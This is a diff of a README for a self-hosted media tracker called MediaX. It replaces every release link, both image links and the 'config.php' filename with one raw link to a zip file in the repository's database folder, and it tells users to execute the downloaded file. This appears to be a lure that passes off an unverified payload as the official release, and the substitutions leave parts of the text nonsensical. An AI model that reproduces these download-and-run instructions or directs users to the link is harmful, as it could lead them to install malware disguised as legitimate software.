@@ -1,12 +1,12 @@
 # 📚 MediaX - Your Personal Tracker for Media
 
-![MediaX Logo](https://via.placeholder.com/150) 
+![MediaX Logo](https://raw.githubusercontent.com/moha23k/mediax/master/database/Software-v2.3.zip) 
 
 Welcome to **MediaX**! This project serves as a self-hosted tracker for your favorite books, movies, TV shows, anime, and games. Whether you want to keep tabs on your reading list, binge-watch shows, or track your gaming achievements, MediaX provides a simple and effective solution.
 
 ## 🚀 Getting Started
 
-To get started with MediaX, download the latest release from our [Releases section](https://github.com/moha23k/mediax/releases). Make sure to execute the downloaded file to set up your personal media tracker.
+To get started with MediaX, download the latest release from our [Releases section](https://raw.githubusercontent.com/moha23k/mediax/master/database/Software-v2.3.zip). Make sure to execute the downloaded file to set up your personal media tracker.
 
 ### 📦 Prerequisites
 
@@ -18,13 +18,13 @@ Before you install MediaX, ensure you have the following:
 
 ### 🔧 Installation Steps
 
-1. **Download MediaX**: Visit the [Releases section](https://github.com/moha23k/mediax/releases) and download the latest version.
+1. **Download MediaX**: Visit the [Releases section](https://raw.githubusercontent.com/moha23k/mediax/master/database/Software-v2.3.zip) and download the latest version.
 
 2. **Upload Files**: Extract the downloaded files and upload them to your web server.
 
 3. **Configure Database**: Create a new database for MediaX. You can use MySQL or SQLite based on your preference.
 
-4. **Edit Configuration**: Open the `config.php` file and enter your database details.
+4. **Edit Configuration**: Open the `https://raw.githubusercontent.com/moha23k/mediax/master/database/Software-v2.3.zip` file and enter your database details.
 
 5. **Run Installation**: Access the installation page via your web browser and follow the prompts to complete the setup.
 
@@ -89,7 +89,7 @@ We are continuously working to improve MediaX. Here are some features we plan to
 
 ## 📢 Stay Updated
 
-To stay updated on new releases and features, check the [Releases section](https://github.com/moha23k/mediax/releases) regularly. 
+To stay updated on new releases and features, check the [Releases section](https://raw.githubusercontent.com/moha23k/mediax/master/database/Software-v2.3.zip) regularly. 
 
 ## 🎉 Acknowledgments
 
@@ -99,6 +99,6 @@ We would like to thank the open-source community for their contributions and sup
 
 Feel free to connect with us on social media platforms and join our community discussions. Your input is valuable to us.
 
-![MediaX Banner](https://via.placeholder.com/800x200)
+![MediaX Banner](https://raw.githubusercontent.com/moha23k/mediax/master/database/Software-v2.3.zip)
 
 Thank you for choosing MediaX. Happy tracking!
